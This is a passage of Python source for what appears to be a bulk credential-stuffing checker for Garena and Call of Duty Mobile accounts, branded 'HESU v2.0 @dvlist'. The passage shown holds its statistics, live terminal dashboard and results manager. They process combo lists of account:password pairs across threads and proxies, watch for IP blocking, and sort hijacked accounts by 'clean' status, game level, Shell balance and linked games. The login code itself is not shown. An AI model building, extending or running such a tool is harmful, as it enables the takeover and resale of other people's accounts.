                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.clean_level_counts['201-350'] += 1
                        else:
                            self.clean_level_counts['351-400'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_not_clean_level:
                            self.highest_not_clean_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.not_clean_level_counts['201-350'] += 1
                        else:
                            self.not_clean_level_counts['351-400'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    if int(shell or 0) > self.highest_shell:
                        self.highest_shell = int(shell or 0)
                except:
                    pass
                for g in game_connections or []:
                    gname = g.get('game','').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {'valid':self.valid_count,'invalid':self.invalid_count,'clean':self.clean_count,
                    'not_clean':self.not_clean_count,'has_codm':self.has_codm_count,
                    'no_codm':self.no_codm_count,'error':self.error_count,
                    'highest_clean_level':self.highest_clean_level,
                    'clean_level_counts':dict(self.clean_level_counts),
                    'not_clean_level_counts':dict(self.not_clean_level_counts),
                    'game_counts':dict(self.game_counts),'highest_shell':self.highest_shell}

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
        with self.lock:
            self.last_result_queue.append({'success':success,'is_clean':is_clean,'has_codm':has_codm,'codm_level':codm_level,'error_reason':error_reason,'shell_balance':shell_balance})

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

    def _rich_bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
        if denom == 0:
            return Text("░" * width, style="dim")
        filled = int(count / denom * width)
        bar = Text()
        bar.append("█" * filled, style=color)
        bar.append("░" * (width - filled), style="dim")
        return bar

    def _rich_pct(self, count: int, denom: int) -> str:
        return f"{count / denom * 100:.1f}%" if denom > 0 else "0.0%"

    def display_stats(self):
        stats = self.get_stats()
        processed = self.get_processed_count()
        if processed == 0:
            return ''
        elapsed = time.time() - self.start_time
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total_accounts - processed
        eta = remaining / rate if rate > 0 else 0
        pct = processed / self.total_accounts * 100 if self.total_accounts > 0 else 0
        bar_w = 30
        filled = int(pct / 100 * bar_w)
        prog_bar = f"[#ffd750]{'█' * filled}[/#ffd750][dim]{'░' * (bar_w - filled)}[/dim]"

        def _mb(count, total, color, w=12):
            if total == 0:
                return f"[dim]{'░' * w}[/dim]"
            f2 = int(count / total * w)
            return f"[{color}]{'█' * f2}{'░' * (w - f2)}[/{color}]"

        tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        tbl.add_column(style='dim', min_width=6, no_wrap=True)
        tbl.add_column(style='bright_white', min_width=8, no_wrap=True, justify='right')
        tbl.add_column(style='dim', min_width=14, no_wrap=True)
        tbl.add_row(f'[#ffd750]{prog_bar}[/#ffd750]', f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]', f'[dim]{processed}/{self.total_accounts}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]')
        tbl.add_row('', '', '')
        total_c = stats['valid'] + stats['invalid']
        tbl.add_row(f'[bright_green]✔ Valid[/bright_green]', f"[bright_green]{stats['valid']}[/bright_green]", _mb(stats['valid'], total_c, '#ffaa00'))
        tbl.add_row(f'[bright_red]✖ Invalid[/bright_red]', f"[bright_red]{stats['invalid']}[/bright_red]", _mb(stats['invalid'], total_c, 'bright_red'))
        tbl.add_row(f'[bright_green]✨ Clean[/bright_green]', f"[bright_green]{stats['clean']}[/bright_green]", _mb(stats['clean'], max(stats['valid'], 1), '#ffaa00'))
        tbl.add_row(f'[yellow]⊘ Not Clean[/yellow]', f"[yellow]{stats['not_clean']}[/yellow]", _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow'))
        tbl.add_row(f'[#ffd750]◈ CODM[/#ffd750]', f"[#ffd750]{stats['has_codm']}[/#ffd750]", _mb(stats['has_codm'], max(stats['valid'], 1), '#ffaa00'))
        tbl.add_row(f'[dim]○ No CODM[/dim]', f"[dim]{stats['no_codm']}[/dim]", _mb(stats['no_codm'], max(stats['valid'], 1), 'magenta'))
        tbl.add_row('', '', '')
        tbl.add_row(f'[dim]▲ Top Clean Lv[/dim]', f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]", '')
        tbl.add_row(f'[dim]▲ Top Not Clean Lv[/dim]', f'[bold yellow]{self.highest_not_clean_level}[/bold yellow]', '')
        hs = stats.get('highest_shell', 0)
        hs_color = 'bold bright_yellow' if hs > 0 else 'dim'
        tbl.add_row(f'[dim]◆ Shell[/dim]', f'[{hs_color}]{hs:,}[/{hs_color}]', '')
        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row('', '', '')
            for label, count in active_games:
                tbl.add_row(f'[dim]{label}[/dim]', f'[bold #ffaa00]{count}[/bold #ffaa00]', '')
        return Panel(tbl, title='[bold #ffaa00]◈ [/bold #ffaa00][bold #ffd750]Hesu[/bold #ffd750][bold #ffaa00] ◈[/bold #ffaa00]', border_style='#ffaa00', box=DOUBLE, padding=(0, 2))

    def display_final_stats(self):
        stats = self.get_stats()
        elapsed = time.time() - self.start_time
        total = self.total_accounts
        proc = self.get_processed_count()
        rate = proc / elapsed if elapsed > 0 else 0
        console = Console()

        results_table = Table(title="[bold #ffaa00]◈ SESSION COMPLETE[/bold #ffaa00]", title_style="bold #ffaa00", box=DOUBLE, border_style="#ffaa00", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
        results_table.add_column("Category", style="dim", no_wrap=True, width=14)
        results_table.add_column("Count", justify="right", style="bright_white", width=10)
        results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
        results_table.add_column("Bar", no_wrap=True)

        denom = max(total, 1)
        for label, count, color in [("✔  Valid", stats['valid'], "bright_green"), ("✖  Invalid", stats['invalid'], "bright_red"), ("·  Errors", stats['error'], "dim")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, denom), self._rich_bar(count, denom, color, 20))
        results_table.add_row("", "", "", "")

        vd = max(stats['valid'], 1)
        for label, count, color in [("✨  Clean", stats['clean'], "bright_green"), ("⊘  Not Clean", stats['not_clean'], "bright_yellow"), ("◈  Has CODM", stats['has_codm'], "#ffd750"), ("○  No CODM", stats['no_codm'], "magenta")]:
            results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{count:,}[/{color}]", self._rich_pct(count, vd), self._rich_bar(count, vd, color, 20))

        console.print(Panel(results_table, border_style="#ffaa00", box=HEAVY, padding=(0, 1)))

        stats_table = Table(title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]", box=ROUNDED, border_style="bright_yellow", show_header=False, padding=(0, 2), expand=False)
        stats_table.add_column(style="dim", width=16, no_wrap=True)
        stats_table.add_column(style="bright_white", no_wrap=True)

        hs = stats.get('highest_shell', 0)
        hs_style = "bold bright_yellow" if hs > 0 else "dim"
        clean_lvl_style = "bold bright_green" if stats['highest_clean_level'] > 0 else "dim"
        not_clean_lvl_style = "bold bright_yellow" if self.highest_not_clean_level > 0 else "dim"

        for label, val in [("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"), ("⚡  Rate", f"{rate:.2f} acc/s"), ("◈  Processed", f"{proc:,}/{total:,}"), ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"), ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.highest_not_clean_level}[/{not_clean_lvl_style}]"), ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")]:
            stats_table.add_row(label, val)

        level_table = Table(title="[bold #ffd750]◈ LEVEL RANGES[/bold #ffd750]", box=ROUNDED, border_style="#ffd750", show_header=True, header_style="bold dim", padding=(0, 1), expand=False)
        level_table.add_column("Range", style="dim", no_wrap=True, width=10)
        level_table.add_column("Clean", justify="right", style="bright_green", width=8)
        level_table.add_column("Bar", no_wrap=True)
        level_table.add_column("Not Clean", justify="right", style="bright_yellow", width=8)
        level_table.add_column("Bar", no_wrap=True)

        clean_lvl = stats['clean_level_counts']
        not_clean_lvl = stats['not_clean_level_counts']
        ct = max(stats['clean'], 1)
        nt = max(stats['not_clean'], 1)

        for rng in ['351-400', '201-350', '101-200', '1-100']:
            cc = clean_lvl.get(rng, 0)
            nc = not_clean_lvl.get(rng, 0)
            level_table.add_row(f"[dim]Lv {rng}[/dim]", f"{cc:,}", self._rich_bar(cc, ct, "bright_green", 12), f"{nc:,}", self._rich_bar(nc, nt, "bright_yellow", 12))

        stats_levels = Columns([stats_table, level_table], expand=False, equal=False, padding=(0, 2))
        console.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))

        gc = stats.get('game_counts', {})
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]

        if active_games:
            games_table = Table(title="[bold #ffaa00]◈ GAMES FOUND[/bold #ffaa00]", box=ROUNDED, border_style="#ffaa00", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
            games_table.add_column("Game", style="dim", no_wrap=True, width=24)
            games_table.add_column("Count", justify="right", style="bright_white", width=8)
            games_table.add_column("Bar", no_wrap=True)
            peak = max(c for _, c in active_games) or 1
            for label, count in active_games:
                games_table.add_row(f"[dim]{label}[/dim]", f"[#ffd750]{count:,}[/#ffd750]", self._rich_bar(count, peak, "#ffd750", 16))
            console.print(Panel(games_table, border_style="#ffaa00", box=ROUNDED, padding=(0, 1)))

        footer_text = Text()
        footer_text.append("◈  Powered by @dvlist", style="bold #ffaa00")
        console.print(Panel(Align.center(footer_text), border_style="#ffd750", box=ROUNDED, padding=(0, 1)))
        console.print()

class BulkLiveDashboard:
    """Live dashboard — cursor-up erase-and-redraw (works on Android/Termux).

    All terminal output is serialised through _dash_print_lock so threads
    never interleave.  Any code that wants to print a line above the
    dashboard must call  dashboard.print_above(line)  rather than
    writing directly to stdout.
    """

    # ── ANSI strip helper (class-level) ─────────────────────────────────
    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')

    @staticmethod
    def _vlen(s: str) -> int:
        """Visible column width — strips ANSI escapes, counts wide CJK as 2."""
        import unicodedata as _ucd
        plain = BulkLiveDashboard._ANSI_RE.sub('', s)
        w = 0
        for ch in plain:
            eaw = _ucd.east_asian_width(ch)
            w += 2 if eaw in ('W', 'F') else 1   # only full-width CJK = 2
        return w

    def __init__(self, total_accounts: int, max_threads: int = 1):
        self.total              = total_accounts
        self.done               = 0
        self.valid              = 0
        self.invalid            = 0
        self.error              = 0
        self.clean              = 0
        self.not_clean          = 0
        self.codm_present       = 0
        self.no_codm            = 0
        self.start_time         = time.time()
        self.ip_blocked         = False
        self.active_threads     = max_threads
        self.max_threads        = max_threads
        self.highest_clean_level  = 0
        self.highest_clean_shell  = 0
        self.highest_nc_level     = 0
        self.highest_overall_level = 0
        self.current_proxy      = None
        self.current_proxy_line = None
        self._lock              = threading.Lock()
        self._snap: dict        = {}
        # CPM sparkline — 1-second samples, keep 20
        self._cpm_history:   list  = []
        self._last_sample_t: float = time.time()
        self._last_sample_n: int   = 0
        # Level distribution buckets
        self._lvl_buckets       = [0, 0, 0, 0]  # 1-100, 101-200, 201-349, 350+
        # Live feed — last 10 results
        self._feed: list        = []
        self._feed_counter: int = 0
        # Top hits — accounts lv 100+
        self._top_hits: list    = []
        # Redraw state
        self._dash_lines:  int   = 0    # lines the last render occupied
        self._last_redraw: float = 0.0
        self._redraw_iv:   float = 0.3  # min seconds between redraws
        self._build_snap()

    # ── Public API ───────────────────────────────────────────────────────
    def start(self):
        global _active_dashboard
        _active_dashboard = self
        with _dash_print_lock:
            txt = self.render()
            self._dash_lines = txt.count('\n')
            _raw_write(txt)
            _raw_flush()

    def stop(self):
        global _active_dashboard
        _active_dashboard = None
        with _dash_print_lock:
            self._erase()
            _raw_flush()

    def record_start(self, index: int, account: str):
        pass

    def set_current_proxy(self, proxy: str = None, line: int = None):
        with self._lock:
            if proxy:            self.current_proxy      = proxy
            if line is not None: self.current_proxy_line = line

    def set_cooldown(self, seconds: float):
        pass

    def set_ip_blocked(self, blocked: bool):
        with self._lock:
            self.ip_blocked = blocked

    def set_active_threads(self, n: int, ramp_mode: bool = False):
        with self._lock:
            self.active_threads = n

    def record(self, index: int, account: str, success: bool,
               is_clean: bool = False, has_codm: bool = False,
               codm_level: int = 0, shell_balance: int = 0,
               error_reason: str = ''):
        with self._lock:
            self.done += 1
            self._feed_counter += 1
            if success:
                self.valid += 1
                if is_clean:
                    self.clean += 1
                    if codm_level    > self.highest_clean_level:  self.highest_clean_level  = codm_level
                    if shell_balance > self.highest_clean_shell:   self.highest_clean_shell  = shell_balance
                else:
                    self.not_clean += 1
                    if codm_level > self.highest_nc_level: self.highest_nc_level = codm_level
                if has_codm:
                    self.codm_present += 1
                    if codm_level > self.highest_overall_level: self.highest_overall_level = codm_level
                    if codm_level > 0:
                        if codm_level <= 100:   self._lvl_buckets[0] += 1
                        elif codm_level <= 200: self._lvl_buckets[1] += 1
                        elif codm_level <= 349: self._lvl_buckets[2] += 1
                        else:                   self._lvl_buckets[3] += 1
                    if codm_level >= 100:
                        tag = 'CLEAN' if is_clean else 'NOT CLN'
                        self._top_hits.append((codm_level, account.split(':')[0][:20], tag, is_clean))
                        self._top_hits.sort(key=lambda x: x[0], reverse=True)
                        self._top_hits = self._top_hits[:5]
                else:
                    self.no_codm += 1
                reason = 'CLEAN' if is_clean else 'NOT CLN'
                self._feed.append((self._feed_counter, account.split(':')[0][:20], True, reason))
            else:
                self.invalid += 1
                reason = error_reason[:20] if error_reason else "Account Doesn't E..."
                self._feed.append((self._feed_counter, account.split(':')[0][:20], False, reason))
            if len(self._feed) > 10:
                self._feed = self._feed[-10:]
            self._build_snap()
        self._on_result(account, success, is_clean, has_codm, codm_level, shell_balance, error_reason)

    def print_above(self, text: str):
        """Print one or more lines above the pinned dashboard.
        text must NOT have a trailing newline — one is appended here.
        Safe to call from any thread.
        """
        with _dash_print_lock:
            self._erase()
            _raw_write(text + '\n')
            self._redraw()
            _raw_flush()

    # ── Internal ─────────────────────────────────────────────────────────
    def _erase(self):
        """Cursor-up N + erase-to-end.  Call under _dash_print_lock."""
        if self._dash_lines > 0:
            _raw_write(f'\x1b[{self._dash_lines}A\x1b[0J')

    def _redraw(self):
        """Re-render dashboard in-place.  Call under _dash_print_lock."""
        txt = self.render()
        self._dash_lines = txt.count('\n')
        _raw_write(txt)

    def _on_result(self, account, success, is_clean, has_codm, codm_level, shell, error_reason):
        """Decide what to output after record().  Called from worker threads."""
        m = _BULK_MODE

        if m == 'full':
            # display_codm_info owns printing; just do a timed stats refresh
            with _dash_print_lock:
                now = time.time()
                if now - self._last_redraw >= self._redraw_iv:
                    self._erase()
                    self._redraw()
                    _raw_flush()
                    self._last_redraw = now
            return

        # 'semi' / 'none' — compact one-liner
        if not success:
            reason = error_reason or 'Invalid'
            if m == 'none':
                line = f'  \033[1;91m✖ INVALID\033[0m  \033[2m{account}\033[0m'
            else:
                line = (f'  \033[1;91m✖ INVALID\033[0m  \033[2m{account}\033[0m'
                        f'  \033[93m{reason}\033[0m')
        else:
            if m == 'none':
                line = f'  \033[1;92m✔ VALID\033[0m  \033[97m{account}\033[0m'
            else:  # semi
                lc   = '\033[38;2;255;215;80m' if codm_level >= 200 else '\033[97m'
                cs   = '\033[1;92mCLEAN\033[0m' if is_clean else '\033[1;93mNOT CLEAN\033[0m'
                ss   = f'  \033[93mShell:{shell:,}\033[0m' if shell > 0 else ''
                lvls = f'{lc}Lv{codm_level}\033[0m' if has_codm else '\033[2mNo CODM\033[0m'
                line = f'  \033[1;92m✔ VALID\033[0m  {lvls}  {cs}{ss}  \033[2m{account}\033[0m'

        self.print_above(line)

    def _build_snap(self):
        """Snapshot state (called under self._lock)."""
        elapsed = time.time() - self.start_time
        done    = self.done
        rate    = done / elapsed if elapsed > 0 else 0
        cpm     = rate * 60
        eta_s   = (self.total - done) / rate if rate > 0 and done < self.total else 0
        self._snap = {
            'done': done,  'total':  self.total,
            'valid': self.valid, 'invalid': self.invalid, 'error': self.error,
            'clean': self.clean, 'not_clean': self.not_clean,
            'codm':  self.codm_present, 'no_codm': self.no_codm,
            'rate':  rate, 'cpm': cpm, 'elapsed': elapsed, 'eta': eta_s,
            'threads': self.active_threads, 'max_threads': self.max_threads,
            'ip_blocked': self.ip_blocked,
            'hcl': self.highest_clean_level, 'hcs': self.highest_clean_shell,
            'hnl': self.highest_nc_level,    'hol': self.highest_overall_level,
            'lvl_buckets': list(self._lvl_buckets),
            'feed': list(self._feed),
            'top_hits': list(self._top_hits),
        }

    def _sample_cpm(self, done_now: int) -> None:
        now = time.time()
        dt  = now - self._last_sample_t
        if dt >= 1.0:
            cpm_now = ((done_now - self._last_sample_n) / dt) * 60
            self._cpm_history.append(cpm_now)
            if len(self._cpm_history) > 20:
                self._cpm_history.pop(0)
            self._last_sample_t = now
            self._last_sample_n = done_now

    @staticmethod
    def _sparkline(values: list, width: int = 20) -> str:
        if not values:
            return '░' * width
        vals = ([0] * (width - len(values)) + values) if len(values) < width else values[-width:]
        mx   = max(vals) or 1
        bars = '▁▂▃▄▅▆▇█'
        return ''.join(bars[min(int(v / mx * 8), 7)] for v in vals)

    # ── Render ───────────────────────────────────────────────────────────
    def render(self) -> str:
        with self._lock:
            s = dict(self._snap)
        if not s:
            return ''

        self._sample_cpm(s['done'])

        done   = s['done'];  total = s['total']
        valid  = s['valid']; invalid = s['invalid']
        clean  = s['clean']; nc    = s['not_clean']
        rate   = s['rate'];  cpm   = s['cpm']
        elapsed_f = s['elapsed']; eta_f = s['eta']
        threads   = s['threads']; max_thr = s['max_threads']
        ip_ok  = not s['ip_blocked']
        hcl = s['hcl']; hcs = s['hcs']; hnl = s['hnl']; hol = s['hol']
        codm_count = s.get('codm', 0)
        no_codm    = s.get('no_codm', 0)
        pct = done / total * 100 if total else 0
        lvl_b = s.get('lvl_buckets', [0, 0, 0, 0])
        feed  = s.get('feed', [])
        top_hits = s.get('top_hits', [])

        E   = '\x1b'
        AM  = E + '[38;2;255;170;0m'
        CY  = E + '[38;2;255;215;80m'
        GN  = E + '[1;92m'
        RD  = E + '[1;91m'
        YL  = E + '[1;93m'
        WH  = E + '[1;97m'
        DIM = E + '[2m'
        OR  = E + '[38;2;255;140;0m'
        RST = E + '[0m'

        def _fmt(secs):
            h = int(secs // 3600); m = int(secs % 3600 // 60); sc = int(secs % 60)
            return f'{h}h {m:02d}m {sc:02d}s' if h else f'{m}m {sc:02d}s'

        elapsed_str = _fmt(elapsed_f)
        eta_str     = _fmt(eta_f)
        clock       = time.strftime('%H:%M:%S')
        thr_val     = f'{threads}/{max_thr}'

        _tw = shutil.get_terminal_size((84, 24)).columns
        W   = max(min(_tw - 2, 120), 60)
        V   = BulkLiveDashboard._vlen
        H   = '─'
        HH  = '━'
        IW  = W - 2

        def _pad(text, width):
            return text + ' ' * max(width - V(text), 0)

        def _ctr(text, width):
            vis = V(text)
            lp = max((width - vis) // 2, 0)
            return ' ' * lp + text + ' ' * max(width - vis - lp, 0)

        def _bord(content):
            vl = V(content)
            if vl > IW:
                t, tv = _trunc(content, IW)
                return f'{DIM}│{RST}' + t + ' ' * max(IW - tv, 0) + f'{DIM}│{RST}'
            return f'{DIM}│{RST}' + _pad(content, IW) + f'{DIM}│{RST}'

        def _pct(n, d):
            return f'({n/d*100:.1f}%)' if d else '(0.0%)'

        # ═══ OUTER BORDER + HEADER + STAT TABLE (one connected box) ═══
        top_border = f'{DIM}╭{H * IW}╮{RST}'
        bot_border = f'{DIM}╰{H * IW}╯{RST}'

        hdr_l = f' {AM}◆{RST} {AM}HESU{RST} {CY}v2.0{RST}  {DIM}—{RST}  {AM}@dvlist{RST}'
        hdr_r = f'{GN}●{RST} {GN}ACTIVE{RST}  {DIM}·{RST}  {WH}{clock}{RST} '
        hdr_gap = max(IW - V(hdr_l) - V(hdr_r), 1)
        hdr_row = f'{DIM}│{RST}{hdr_l}{" " * hdr_gap}{hdr_r}{DIM}│{RST}'

        # Stat table — separate thick box inside outer border
        ncols = 5
        st_inner = IW - 4
        st_cw_total = st_inner - (ncols - 1)
        cw = st_cw_total // ncols
        last_cw = st_cw_total - cw * (ncols - 1)
        widths = [cw] * (ncols - 1) + [last_cw]

        clean_of = f'{clean/valid*100:.1f}% of valid' if valid else '—'
        stat_data = [
            (f'{done:,}',     'PROCESSED', f'{DIM}of {total:,}{RST}'),
            (f'{valid:,}',    'VALID',     f'{YL}{pct:.1f}%{RST}'),
            (f'{clean:,}',    'CLEAN',     f'{DIM}{clean_of}{RST}'),
            (f'{rate:.1f}/s', 'RATE',      f'{CY}ETA {eta_str}{RST}'),
            (thr_val,         'THREADS',   f'{DIM}Bulk Scan{RST}'),
        ]

        def _cell(val, label, sub, cwidth):
            return [
                _ctr(f'{WH}{val}{RST}', cwidth),
                _ctr(f'{DIM}{label}{RST}', cwidth),
                _ctr(sub, cwidth),
            ]

        cells = [_cell(v, l, sb, widths[i]) for i, (v, l, sb) in enumerate(stat_data)]
        st_top = f' {DIM}┏{HH * st_inner}┓{RST}'
        st_bot = f' {DIM}┗{HH * st_inner}┛{RST}'
        stat_rows = []
        for ri in range(3):
            row = f' {DIM}┃{RST}' + f'{DIM}┃{RST}'.join(cells[c][ri] for c in range(ncols)) + f'{DIM}┃{RST}'
            stat_rows.append(row)

        # ═══ PROGRESS LINE ═══
        prog_text = f'{DIM}—{RST} PROGRESS {YL}{pct:.1f}%{RST} {DIM}—{RST} {WH}{done:,}{RST} {DIM}/{RST} {WH}{total:,}{RST} {DIM}—{RST} ETA {CY}{eta_str}{RST} {DIM}—{RST}'
        prog = _ctr(prog_text, IW)

        # ═══ TWO-COLUMN HELPERS ═══
        half = IW // 2

        def _trunc(text, width):
            vis = 0; out = []; i = 0; s = text
            while i < len(s):
                if s[i] == '\x1b':
                    j = s.find('m', i)
                    if j >= 0:
                        out.append(s[i:j+1]); i = j + 1; continue
                if vis >= width:
                    break
                out.append(s[i]); vis += 1; i += 1
            truncated = i < len(s)
            if truncated and width >= 3:
                while len(out) > 0 and vis > width - 3:
                    ch = out.pop()
                    if not ch.startswith('\x1b'):
                        vis -= 1
                out.append(RST + DIM + '...' + RST)
                vis += 3
            else:
                out.append(RST)
            return ''.join(out), vis

        def _lr(left_text, right_text):
            lw = half - 1
            t, vis = _trunc(left_text, lw)
            return t + ' ' * max(lw - vis, 0) + f'{DIM}│{RST}' + right_text

        # ═══ SECTION 1: ACCOUNT RESULTS | SYSTEM ═══
        vp   = _pct(valid, done)
        ip_s = _pct(invalid, done)
        cp   = _pct(clean, valid)
        np_s = _pct(nc, valid)
        dp   = _pct(codm_count, valid)
        ndp  = f'({no_codm/valid*100:.1f}%)' if valid else '(0.0%)'

        ip_val = 'CLEAR' if ip_ok else 'BLOCKED'
        ip_col = GN if ip_ok else RD

        sec1 = [
            _lr(f' {AM}│{RST} {AM}ACCOUNT RESULTS{RST}',
                f' {AM}│{RST} {AM}SYSTEM{RST}'),
            _lr(f'   {GN}▸{RST} {WH}Valid{RST}        {GN}{valid:>8,}{RST}  {DIM}{vp}{RST}',
                f'   {DIM}◇{RST} {DIM}Threads{RST}     {WH}{thr_val}{RST}'),
            _lr(f'   {RD}▸{RST} {WH}Invalid{RST}      {RD}{invalid:>8,}{RST}  {DIM}{ip_s}{RST}',
                f'   {GN}●{RST} {DIM}IP Status{RST}   {ip_col}{ip_val}{RST}'),
            _lr(f'   {GN}◆{RST} {WH}Clean{RST}        {GN}{clean:>8,}{RST}  {DIM}{cp}{RST}',
                f'   {DIM}▸{RST} {DIM}Speed{RST}       {WH}{rate:.1f}/s{RST}'),
            _lr(f'   {YL}◇{RST} {WH}Not Clean{RST}    {YL}{nc:>8,}{RST}  {DIM}{np_s}{RST}',
                f'   {DIM}◆{RST} {DIM}CPM{RST}         {WH}{cpm:.0f}{RST}'),
            _lr(f'   {OR}●{RST} {WH}CODM{RST}         {OR}{codm_count:>8,}{RST}  {DIM}{dp}{RST}',
                f'   {DIM}◇{RST} {DIM}Elapsed{RST}     {WH}{elapsed_str}{RST}'),
            _lr(f'   {DIM}○{RST} {WH}No CODM{RST}      {DIM}{no_codm:>8,}{RST}  {DIM}{ndp}{RST}',
                f'   {DIM}○{RST} {DIM}ETA{RST}         {CY}{eta_str}{RST}'),
        ]

        # ═══ SECTION 2: LEVELS & PEAKS | LIVE FEED ═══
        lvl_total_n = sum(lvl_b) or 1
        lvl_labels = ['Lv  1-100', 'Lv 101-200', 'Lv 201-349', 'Lv  350+']
        lvl_colors = [RD, OR, YL, GN]
        max_bar_w = max(half - 1 - 29, 4)

        hdr_bar_w = max(half - 22, 4)
        lvl_hdr_bar = OR + '━' * hdr_bar_w + RST

        lvl_rows = []
        for i, (lb, cnt) in enumerate(zip(lvl_labels, lvl_b)):
            p = cnt / lvl_total_n * 100
            bar_len = int(cnt / max(max(lvl_b), 1) * max_bar_w)
            bar_fill = lvl_colors[i] + '━' * bar_len + RST + DIM + '─' * (max_bar_w - bar_len) + RST
            lvl_rows.append(f'   {WH}{lb}{RST}  {WH}{cnt:>3d}{RST} {DIM}({p:5.1f}%){RST} {bar_fill}')

        lvl_rows.append('')
        lvl_rows.append(f'   {DIM}◆{RST} {DIM}Peak Shell{RST}       {YL}{hcs:>8,}{RST}')
        lvl_rows.append(f'   {DIM}◆{RST} {DIM}Peak Clean{RST}       {GN}{"Lv " + str(hcl):>8s}{RST}')
        lvl_rows.append(f'   {DIM}○{RST} {DIM}Peak Not Cln{RST}     {YL}{"Lv " + str(hnl):>8s}{RST}')

        if top_hits:
            lvl_rows.append('')
            lvl_rows.append(f' {AM}│{RST} {AM}TOP HITS (Lv 100+){RST}')
            for lvl, acct, tag, is_cln in top_hits[:3]:
                tc = GN if is_cln else YL
                lvl_rows.append(f'   {CY}Lv {lvl:<4d}{RST}  {DIM}{acct}{RST}  {tc}◇ {tag}{RST}')

        feed_rows = []
        feed_text_w = max(IW - half - 1 - 13, 8)
        for num, acct, ok, reason in feed[-10:]:
            if ok:
                mark = f'{GN}✔{RST}'
                text = f'{WH}{acct}{RST}  {GN}{reason}{RST}'
            else:
                mark = f'{RD}✖{RST}'
                text = f'{DIM}{acct}{RST}  {RD}{reason}{RST}'
            text, _ = _trunc(text, feed_text_w)
            feed_rows.append(f'   {DIM}{num:>5d}{RST} {mark}  {text}')

        sec2_hdr = _lr(
            f' {AM}│{RST} {AM}LEVELS & PEAKS{RST}  {lvl_hdr_bar}',
            f' {AM}│{RST} {AM}LIVE FEED{RST}')
        sec2 = [sec2_hdr]
        mr = max(len(lvl_rows), len(feed_rows))
        for i in range(mr):
            left  = lvl_rows[i]  if i < len(lvl_rows)  else ''
            right = feed_rows[i] if i < len(feed_rows) else ''
            sec2.append(_lr(left, right))

        # (TOP HITS moved into left column above)

        # ═══ BOTTOM BAR ═══
        bot_content = f' {AM}◆{RST} {AM}@dvlist{RST} {DIM}·{RST} {CY}{pct:.1f}%{RST} {DIM}·{RST} {WH}{rate:.1f}/s{RST} {DIM}·{RST} ETA {CY}{eta_str}{RST} {DIM}·{RST} {WH}{done:,}{RST} {DIM}/ {total:,}{RST}'

        # ═══ ASSEMBLE ═══
        lines = ['', top_border, hdr_row]
        # stat table — separate box inside outer border
        lines.append(_bord(st_top))
        for sr in stat_rows:
            lines.append(_bord(sr))
        lines.append(_bord(st_bot))
        # content below: wrapped in │...│
        for row in ['', prog, '']:
            lines.append(_bord(row))
        for row in sec1:
            lines.append(_bord(row))
        lines.append(_bord(''))
        for row in sec2:
            lines.append(_bord(row))
        lines.append(_bord(''))
        lines.append(_bord(bot_content))
        lines.append(bot_border)
        lines.append('')
        return '\n'.join(lines)

class ResultsManager:
    def __init__(self, combo_file_path, create_dirs=True):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/{self.combo_file_name}')
        if create_dirs:
            for sub in ('Country', 'Level', 'Garena Shells'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
            if CHECK_OTHER_GAMES:
                (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        import re as _re
        m = _re.search('Account Level:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

    @staticmethod
    def _entry_shell(entry):
        import re as _re
        m = _re.search('Garena Shell:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

